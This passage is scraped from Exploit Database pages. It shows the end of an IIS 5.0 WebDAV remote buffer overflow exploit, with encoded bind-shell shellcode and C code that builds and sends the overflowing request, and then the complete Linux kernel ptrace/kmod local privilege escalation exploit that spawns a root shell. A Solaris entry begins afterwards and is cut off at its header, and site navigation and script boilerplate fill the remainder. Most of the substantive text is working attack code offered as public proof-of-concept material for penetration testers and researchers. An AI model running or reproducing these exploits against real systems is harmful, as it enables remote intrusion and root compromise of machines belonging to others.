4\xfc\xbf""\xd9\x99\xce\xc9\x12\x1c\xc8\xbf\xd9\x99\xc9\x14\x2c\x70""\xbc\xd9\x99\x34\xc9\x66\x0c\xde\xbc\xd9\x99\xf3\xc9\x66""\x0c\xd6\xbc\xd9\x99\x12\x1c\xfc\xbf\xd9\x99\xf3\x99\xc9""\x14\x2c\xc8\xbf\xd9\x99\x34\xc9\x14\x2c\xc0\xbf\xd9\x99""\x34\xc9\x66\x0c\x93\xbc\xd9\x99\xf3\x99\x14\x24\xfc\xbf""\xd9\x99\xce\xf3\x99\xf3\x99\xf3\x99\x14\x2c\x70\xbc\xd9""\x99\x34\xc9\x66\x0c\xa6\xbc\xd9\x99\xf3\xc9\x66\x0c\xd6""\xbc\xd9\x99\xaa\x50\xa0\x14\xfc\xbf\xd9\x99\x96\x1e\xfe""\x66\x66\x66\xf3\x99\xf1\x99\xb9\x99\x99\x09\x14\x2c\xc8""\xbf\xd9\x99\x34\xc9\x14\x2c\xc0\xbf\xd9\x99\x34\xc9\x66""\x0c\x97\xbc\xd9\x99\x10\x1c\xf8\xbf\xd9\x99\xf3\x99\x14""\x24\xfc\xbf\xd9\x99\xce\xc9\x14\x2c\xc8\xbf\xd9\x99\x34""\xc9\x14\x2c\x74\xbc\xd9\x99\x34\xc9\x66\x0c\xd2\xbc\xd9""\x99\xf3\xc9\x66\x0c\xd6\xbc\xd9\x99\xf3\x99\x12\x1c\xf8""\xbf\xd9\x99\x14\x24\xfc\xbf\xd9\x99\xce\xc9\x12\x1c\xc8""\xbf\xd9\x99\xc9\x14\x2c\x70\xbc\xd9\x99\x34\xc9\x66\x0c""\xde\xbc\xd9\x99\xf3\xc9\x66\x0c\xd6\xbc\xd9\x99\x70\x20""\x67\x66\x66\x14\x2c\xc0\xbf\xd9\x99\x34\xc9\x66\x0c\x8b""\xbc\xd9\x99\x14\x2c\xc4\xbf\xd9\x99\x34\xc9\x66\x0c\x8b""\xbc\xd9\x99\xf3\x99\x66\x0c\xce\xbc\xd9\x99\xc8\xcf\xf1""\xe5\x89\x99\x98\x09\xc3\x66\x8b\xc9\xc2\xc0\xce\xc7\xc8""\xcf\xca\xf1\xad\x89\x99\x98\x09\xc3\x66\x8b\xc9\x35\x1d""\x59\xec\x62\xc1\x32\xc0\x7b\x70\x5a\xce\xca\xd6\xda\xd2""\xaa\xab\x99\xea\xf6\xfa\xf2\xfc\xed\x99\xfb\xf0\xf7\xfd""\x99\xf5\xf0\xea\xed\xfc\xf7\x99\xf8\xfa\xfa\xfc\xe9\xed""\x99\xea\xfc\xf7\xfd\x99\xeb\xfc\xfa\xef\x99\xfa\xf5\xf6""\xea\xfc\xea\xf6\xfa\xf2\xfc\xed\x99\xd2\xdc\xcb\xd7\xdc""\xd5\xaa\xab\x99\xda\xeb\xfc\xf8\xed\xfc\xc9\xf0\xe9\xfc""\x99\xde\xfc\xed\xca\xed\xf8\xeb\xed\xec\xe9\xd0\xf7\xff""\xf6\xd8\x99\xda\xeb\xfc\xf8\xed\xfc\xc9\xeb\xf6\xfa\xfc""\xea\xea\xd8\x99\xc9\xfc\xfc\xf2\xd7\xf8\xf4\xfc\xfd\xc9""\xf0\xe9\xfc\x99\xde\xf5\xf6\xfb\xf8\xf5\xd8\xf5\xf5\xf6""\xfa\x99\xcb\xfc\xf8\xfd\xdf\xf0\xf5\xfc\x99\xce\xeb\xf0""\xed\xfc\xdf\xf0\xf5\xfc\x99\xca\xf5\xfc\xfc\xe9\x99\xda""\xf5\xf6\xea\xfc\xd1\xf8\xf7\xfd\xf5\xfc\x99\xdc\xe1\xf0""\xed\xc9\xeb\xf6\xfa\xfc\xea\xea\x99\xda\xf6\xfd\xfc\xfd""\xb9\xfb\xe0\xb9\xe5\xc3\xf8\xf7\xb9\xa5\xf0\xe3\xf8\xf7""\xd9\xfd\xfc\xfc\xe9\xe3\xf6\xf7\xfc\xb7\xf6\xeb\xfe\xa7""\x9b\x99\x86\xd1\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99""\x99\x99\x95\x99\x99\x99\x99\x99\x99\x99\x98\x99\x99\x99""\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99""\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99""\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99""\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99""\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99""\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99""\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99""\x99\x99\xda\xd4\xdd\xb7\xdc\xc1\xdc\x99\x99\x99\x99\x99""\x89\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99\x99""\x99\x99\x99\x99\x99\x99\x90\x90\x90\x90\x90\x90\x90\x90";unsigned char jumpcode[] = "\x8b\xf9\x32\xc0\xfe\xc0\xf2\xae\xff\xe7";/* mov edi, ecx* xor al, al* inc al* repnz scasb* jmp edi*/char body[] = "<?xml version=\"1.0\"?>\r\n<g:searchrequest xmlns:g=\"DAV:\">\r\n" \"<g:sql>\r\nSelect \"DAV:displayname\" from scope()\r\n</g:sql>\r\n</g:searchrequest>\r\n";/* Our code starts here */int main (int argc, char **argv){unsigned long ret;unsigned short port;int tport, bport, s, i, j, r, rt=0;struct hostent *h;struct sockaddr_in dst;char buffer[MAXBUF];if (argc < 2 || argc > 5){printf("IIS 5.0 WebDAV Exploit by RoMaNSoFt <roman@rs-labs.com>. 23/03/2003\nUsage: %s <target host> [target port] [bind port] [ret]\nE.g 1: %s victim.com\nE.g 2: %s victim.com 80 31337 %#.4x\n", argv[0], argv[0], argv[0], RET);exit(-1);}// Default target port = 80if (argc > 2)tport = atoi(argv[2]);elsetport = 80;// Default bind port = 31337if (argc > 3)bport = atoi(argv[3]);elsebport = 31337;// Default ret value = RETif (argc > 4)ret = strtoul(argv[4], NULL, 16);elseret = RET;if ( ret > 0xffff || (ret & 0xff) == 0 || (ret & 0xff00) == 0 ){fprintf(stderr, "RET value must be in 0x0000-0xffff range and it may not contain null-bytes\nAborted!\n");exit(-2);}// Shellcode patchingport = htons(bport);port ^= 0x9999;if ( ((port & 0xff) == 0) || ((port & 0xff00) == 0) ){fprintf(stderr, "Binding-port contains null-byte. Use another port.\nAborted!\n");exit(-3);}*(unsigned short *)&shellcode[PORT_OFFSET] = port;*(unsigned long *)&shellcode[LOADL_OFFSET] = LOADLIBRARYA ^ 0x99999999;*(unsigned long *)&shellcode[GETPROC_OFFSET] = GETPROCADDRESS ^ 0x99999999;// If the last two items contain any null-bytes, exploit will fail.// WARNING: this check is not performed here. Be careful and check it for yourself!// Resolve hostnameprintf("[*] Resolving hostname ...\n");if ((h = gethostbyname(argv[1])) == NULL){fprintf(stderr, "%s: unknown hostname\n", argv[1]);exit(-4);}bcopy(h->h_addr, &dst.sin_addr, h->h_length);dst.sin_family = AF_INET;dst.sin_port = htons(tport);// Socket creationif ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1){perror("Failed to create socket");exit(-5);}// Connectionif (connect(s, (struct sockaddr *)&dst, sizeof(dst)) == -1){perror("Failed to connect");exit(-6);}// Build malicious string...printf("[*] Attacking port %i at %s (EIP = %#.4x%.4x)...\n", tport, argv[1], ((ret >> 8) & 0xff), ret & 0xff);bzero(buffer, MAXBUF);strcpy(buffer, "SEARCH /");i = strlen(buffer);buffer[i] = NOP; // Align for RET overwrite// Normally, EIP will be overwritten with buffer[8+2087] but I prefer to fill some more bytes ;-)for (j=i+1; j < i+2150; j+=2)*(unsigned short *)&buffer[j] = (unsigned short)ret;// The rest is padded with NOP's. RET address should point to this zone!for (; j < i+65535-strlen(jumpcode); j++)buffer[j] = NOP;// Then we skip the body of the HTTP requestmemcpy(&buffer[j], jumpcode, strlen(jumpcode));strcpy(buffer+strlen(buffer), " HTTP/1.1\r\n");sprintf(buffer+strlen(buffer), "Host: %s\r\nContent-Type: text/xml\r\nContent-Length: %d\r\n\r\n", argv[1], strlen(body) + strlen(shellcode));strcpy(buffer+strlen(buffer), body);// This byte is used to mark the beginning of the shellcodememset(buffer+strlen(buffer), 0x01, 1);// And finally, we land into our shellcodememset(buffer+strlen(buffer), NOP, 3);strcpy(buffer+strlen(buffer), shellcode);// Send requestif (send(s, buffer, strlen(buffer), 0) != strlen(buffer)){perror("Failed to send");exit(-7);}printf("[*] Now open another console/shell and try to connect (telnet) to victim port %i...\n", bport);// Receive responsewhile ( (r=recv(s, &buffer[rt], MAXBUF-1, 0)) > 0)rt += r;// This code is not bullet-proof. An evil WWW server could return a response bigger than MAXBUF// and an overflow would occur here. Yes, I'm lazy... :-)buffer[rt] = '\0';if (rt > 0)printf("[*] Victim server issued the following %d bytes of response:\n--\n%s\n--\n[*] Server NOT vulnerable!\n", rt, buffer);elseprintf("[*] Server is vulnerable but the exploit failed! Change RET value (e.g. 0xce04) and try again (when IIS is up again) :-/\n", bport);close(s);}// milw0rm.com [2003-03-24]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 3
Linux Kernel 2.2.x/2.4.x (RedHat) - 'ptrace/kmod' Local Privilege Escalation - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDLinux Kernel 2.2.x/2.4.x (RedHat) - 'ptrace/kmod' Local Privilege EscalationEDB-ID:3CVE:2003-0127EDB Verified:Author:Wojciech PurczynskiType:localExploit:/Platform:LinuxDate:2003-03-30Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/** Linux kernel ptrace/kmod local root exploit** This code exploits a race condition in kernel/kmod.c, which creates* kernel thread in insecure manner. This bug allows to ptrace cloned* process, allowing to take control over privileged modprobe binary.** Should work under all current 2.2.x and 2.4.x kernels.** I discovered this stupid bug independently on January 25, 2003, that* is (almost) two month before it was fixed and published by Red Hat* and others.** Wojciech Purczynski <cliph@isec.pl>** THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY** IT IS PROVIDED "AS IS" AND WITHOUT ANY WARRANTY** (c) 2003 Copyright by iSEC Security Research*/#include <grp.h>#include <stdio.h>#include <fcntl.h>#include <errno.h>#include <paths.h>#include <string.h>#include <stdlib.h>#include <signal.h>#include <unistd.h>#include <sys/wait.h>#include <sys/stat.h>#include <sys/param.h>#include <sys/types.h>#include <sys/ptrace.h>#include <sys/socket.h>#include <linux/user.h>char cliphcode[] ="\x90\x90\xeb\x1f\xb8\xb6\x00\x00""\x00\x5b\x31\xc9\x89\xca\xcd\x80""\xb8\x0f\x00\x00\x00\xb9\xed\x0d""\x00\x00\xcd\x80\x89\xd0\x89\xd3""\x40\xcd\x80\xe8\xdc\xff\xff\xff";#define CODE_SIZE (sizeof(cliphcode) - 1)pid_t parent = 1;pid_t child = 1;pid_t victim = 1;volatile int gotchild = 0;void fatal(char * msg){perror(msg);kill(parent, SIGKILL);kill(child, SIGKILL);kill(victim, SIGKILL);}void putcode(unsigned long * dst){char buf[MAXPATHLEN + CODE_SIZE];unsigned long * src;int i, len;memcpy(buf, cliphcode, CODE_SIZE);len = readlink("/proc/self/exe", buf + CODE_SIZE, MAXPATHLEN - 1);if (len == -1)fatal("[-] Unable to read /proc/self/exe");len += CODE_SIZE + 1;buf[len] = '\0';src = (unsigned long*) buf;for (i = 0; i < len; i += 4)if (ptrace(PTRACE_POKETEXT, victim, dst++, *src++) == -1)fatal("[-] Unable to write shellcode");}void sigchld(int signo){struct user_regs_struct regs;if (gotchild++ == 0)return;fprintf(stderr, "[+] Signal caught\n");if (ptrace(PTRACE_GETREGS, victim, NULL, &regs) == -1)fatal("[-] Unable to read registers");fprintf(stderr, "[+] Shellcode placed at 0x%08lx\n", regs.eip);putcode((unsigned long *)regs.eip);fprintf(stderr, "[+] Now wait for suid shell...\n");if (ptrace(PTRACE_DETACH, victim, 0, 0) == -1)fatal("[-] Unable to detach from victim");exit(0);}void sigalrm(int signo){errno = ECANCELED;fatal("[-] Fatal error");}void do_child(void){int err;child = getpid();victim = child + 1;signal(SIGCHLD, sigchld);doerr = ptrace(PTRACE_ATTACH, victim, 0, 0);while (err == -1 && errno == ESRCH);if (err == -1)fatal("[-] Unable to attach");fprintf(stderr, "[+] Attached to %d\n", victim);while (!gotchild) ;if (ptrace(PTRACE_SYSCALL, victim, 0, 0) == -1)fatal("[-] Unable to setup syscall trace");fprintf(stderr, "[+] Waiting for signal\n");for(;;);}void do_parent(char * progname){struct stat st;int err;errno = 0;socket(AF_SECURITY, SOCK_STREAM, 1);do {err = stat(progname, &st);} while (err == 0 && (st.st_mode & S_ISUID) != S_ISUID);if (err == -1)fatal("[-] Unable to stat myself");alarm(0);system(progname);}void prepare(void){if (geteuid() == 0) {initgroups("root", 0);setgid(0);setuid(0);execl(_PATH_BSHELL, _PATH_BSHELL, NULL);fatal("[-] Unable to spawn shell");}}int main(int argc, char ** argv){prepare();signal(SIGALRM, sigalrm);alarm(10);parent = getpid();child = fork();victim = child + 1;if (child == -1)fatal("[-] Unable to fork");if (child == 0)do_child();elsedo_parent(argv[0]);return 0;}// milw0rm.com [2003-03-30]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 4
Sun SUNWlldap Library Hostname - Local Buffer Overflow - Solaris local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDSun SUNWlldap Library Hostname - Local Buffer OverflowEDB-ID:4CVE:2003-1055EDB Verified:Author:AndiType:localExploit:/Platform:SolarisDate:2003-04-01Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali 